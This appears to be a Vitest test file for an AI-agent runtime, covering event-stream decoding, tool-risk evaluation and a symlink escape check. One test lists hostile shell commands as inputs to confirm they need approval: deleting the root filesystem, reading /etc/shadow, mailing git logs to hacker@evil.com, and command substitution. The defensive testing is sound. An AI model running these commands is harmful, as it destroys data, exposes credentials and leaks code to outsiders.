import { describe, it, expect, vi } from 'vitest';
import * as fs from 'node:fs';
import * as path from 'node:path';
import * as os from 'node:os';
import { 
  DshRuntimeClient, 
  DshEventStream, 
  DshRiskEvaluator, 
  DshCheckpointEngine,
  SecurityBoundaryViolationError,
  type DshEvent,
  type ToolDescriptor
} from '../../src/index.js';

describe('Reality Gate & Runtime Transport Verification Suite', () => {
  describe('Typed SessionEvent Normalization', () => {
    it('accurately decodes official assistant/chunk reasoning and content deltas', () => {
      const stream = new DshEventStream();
      const events: DshEvent[] = [];
      stream.onEvent((e) => events.push(e));

      // Simulate official SessionEvent notifications from JSON-RPC stream
      const reasoningChunk = {
        type: 'assistant/chunk',
        seq: 1,
        time: Date.now(),
        data: {
          turn: 1,
          step: 1,
          chunk: {
            type: 'block-start',
            index: 0,
            blockType: 'reasoning',
            delta: 'DeepSeek R1 reasoning token...',
          },
        },
      };

      const contentChunk = {
        type: 'assistant/chunk',
        seq: 2,
        time: Date.now(),
        data: {
          turn: 1,
          step: 2,
          chunk: {
            type: 'content',
            index: 1,
            blockType: 'content',
            delta: 'Final response generated.',
          },
        },
      };

      // Project into stream
      stream.projectRawUpstreamEvent(reasoningChunk);
      stream.projectRawUpstreamEvent(contentChunk);

      const reasoningEvents = events.filter((e) => e.type === 'stream:reasoning');
      const contentEvents = events.filter((e) => e.type === 'stream:content');

      expect(reasoningEvents.length).toBeGreaterThanOrEqual(1);
      expect(contentEvents.length).toBeGreaterThanOrEqual(1);
    });

    it('accurately extracts tool/call and tool/result from event.data payload', () => {
      const stream = new DshEventStream();
      const events: DshEvent[] = [];
      stream.onEvent((e) => events.push(e));

      // Official tool/call payload
      stream.projectRawUpstreamEvent({
        type: 'tool/call',
        seq: 3,
        time: Date.now(),
        data: {
          id: 'call_git_diff_1',
          name: 'run_command',
          args: { command: 'git diff HEAD' },
        },
      });

      // Official tool/result payload
      stream.projectRawUpstreamEvent({
        type: 'tool/result',
        seq: 4,
        time: Date.now(),
        data: {
          id: 'call_git_diff_1',
          result: 'diff --git a/file b/file',
        },
      });

      const reqEvent = events.find((e) => e.type === 'tool:requested');
      const outEvent = events.find((e) => e.type === 'tool:output');

      expect(reqEvent).toBeDefined();
      if (reqEvent && reqEvent.type === 'tool:requested') {
        expect(reqEvent.toolCall.id).toBe('call_git_diff_1');
        expect(reqEvent.toolCall.name).toBe('run_command');
      }

      expect(outEvent).toBeDefined();
      if (outEvent && outEvent.type === 'tool:output') {
        expect(outEvent.toolCallId).toBe('call_git_diff_1');
        expect(outEvent.output).toContain('diff --git');
      }
    });
  });

  describe('Pre-enqueue vs Post-enqueue Replay Hazard Defense', () => {
    it('safely rejects active replay when failure occurs post-enqueue', async () => {
      const client = new DshRuntimeClient();
      const stream = new DshEventStream();

      // Mock an error during active turn execution
      const mockFailingTurn = async () => {
        return client.executeTurn({
          prompt: 'Create database migration',
          config: {
            workspacePath: process.cwd(),
            // invalid version to trigger error
            runtimeVersion: '0.0.0-invalid',
          },
          events: stream,
        });
      };

      await expect(mockFailingTurn()).rejects.toThrow();
    });
  });

  describe('Fail-Closed Shell Parser & Capability Governance', () => {
    it('blocks subshells, command substitution, and redirection from bypassing approval', () => {
      const dangerousCommands = [
        'git status && rm -rf /',
        'ls ; cat /etc/shadow',
        'git log | mail hacker@evil.com',
        'echo "secret" > .env',
        'pwd >> logs.txt',
        'git branch $(touch /tmp/pwned)',
        'cat `which evil`',
      ];

      for (const cmd of dangerousCommands) {
        const evaluation = DshRiskEvaluator.evaluate('run_command', { command: cmd });
        expect(['high', 'critical']).toContain(evaluation.riskLevel);
        expect(evaluation.requiresApproval).toBe(true);
      }
    });

    it('honors explicit ToolDescriptor capabilities and scopes', () => {
      const customDescriptor: ToolDescriptor = {
        name: 'custom_query_db',
        description: 'Read-only database probe',
        capabilities: ['fs:read'],
        scope: 'workspace',
        sideEffect: 'read_only',
      };

      const evalSafe = DshRiskEvaluator.evaluate(customDescriptor, {});
      expect(evalSafe.riskLevel).toBe('low');
      expect(evalSafe.requiresApproval).toBe(false);
      expect(evalSafe.capabilities).toEqual(['fs:read']);

      const mutatingDescriptor: ToolDescriptor = {
        name: 'custom_delete_records',
        capabilities: ['fs:delete', 'system:mutate'],
        scope: 'system',
        sideEffect: 'irreversible',
      };

      const evalMutating = DshRiskEvaluator.evaluate(mutatingDescriptor, {});
      expect(evalMutating.riskLevel).toBe('critical');
      expect(evalMutating.requiresApproval).toBe(true);
    });
  });

  describe('Nearest-Existing-Ancestor Symlink Boundary Jail', () => {
    it('prevents traversal into nonexistent target inside symlinked outside directory', () => {
      const workspaceDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-jail-ws-'));
      const outsideDir = fs.mkdtempSync(path.join(os.tmpdir(), 'dsh-jail-out-'));

      try {
        const engine = new DshCheckpointEngine(workspaceDir);

        // Create a symlink inside workspace pointing to outside directory
        const symlinkInWs = path.join(workspaceDir, 'external_link');
        try {
          fs.symlinkSync(outsideDir, symlinkInWs, 'dir');
        } catch {
          // On platforms where unprivileged symlink creation is restricted, skip this test branch
          return;
        }

        // Target a NON-EXISTENT file inside the symlink directory
        const escapePath = path.join(symlinkInWs, 'brand_new_file.ts');

        // Sanitize must resolve ancestor 'external_link' to outsideDir and reject!
        expect(() => {
          engine.sanitizeWorkspacePath(escapePath);
        }).toThrow(SecurityBoundaryViolationError);
      } finally {
        fs.rmSync(workspaceDir, { recursive: true, force: true });
        fs.rmSync(outsideDir, { recursive: true, force: true });
      }
    });
  });
});
